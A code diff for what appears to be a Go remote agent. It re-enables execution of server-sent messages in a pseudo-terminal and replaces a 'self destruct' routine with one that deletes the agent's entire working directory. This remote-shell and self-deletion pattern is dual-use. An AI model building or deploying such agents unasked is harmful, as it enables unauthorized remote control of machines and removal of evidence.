@@ -2,12 +2,10 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
 	"log"
 	"net/url"
 	"os"
 	"os/signal"
-	"path/filepath"
 
 	"github.com/jessevdk/go-flags"
 
@@ -72,10 +70,14 @@ func connect(accessTokenChan *chan oauth.AccessToken, initialToken oauth.AccessT
 			message := client.Message{}
 			json.Unmarshal([]byte(msg), &message)
 			if message.Message == "self destruct" {
-				selfDestruct()
+				err := removeAgentDirectory()
+				if err != nil {
+					// return error to apollo
+				}
+				return
 			}
-			// pty := shell.CreateNewPTY(message.SessionID)
-			// pty.Execute(message.Message)
+			pty := shell.CreateNewPTY(message.SessionID)
+			pty.Execute(message.Message)
 		case err := <-errs:
 			log.Println(err)
 		case <-*interruptSignal:
@@ -86,42 +88,17 @@ func connect(accessTokenChan *chan oauth.AccessToken, initialToken oauth.AccessT
 	}
 }
 
-func selfDestruct() error {
+func removeAgentDirectory() error {
 	path, err := os.Getwd()
 	if err != nil {
 		log.Println(err)
-		return nil
-	}
-
-	RemoveContents(path)
-	return nil
-}
-
-func RemoveContents(dir string) error {
-	d, err := os.Open(dir)
-	if err != nil {
 		return err
 	}
-	defer d.Close()
-	names, err := d.Readdirnames(-1)
-	if err != nil {
-		return err
-	}
-	// err = os.RemoveAll(dir)
-	err = os.RemoveAll(filepath.Join(dir, "test"))
-	if err != nil {
-		print("*************")
-		print(err)
-	}
-	for _, name := range names {
-		fmt.Println(name)
-		fmt.Println(dir)
-		err = os.RemoveAll(dir)
 
-		if err != nil {
-			print("*************")
-			print(err)
-		}
+	err = os.RemoveAll(path)
+	if err != nil {
+		log.Println(err)
+		return err
 	}
 	return nil
 }
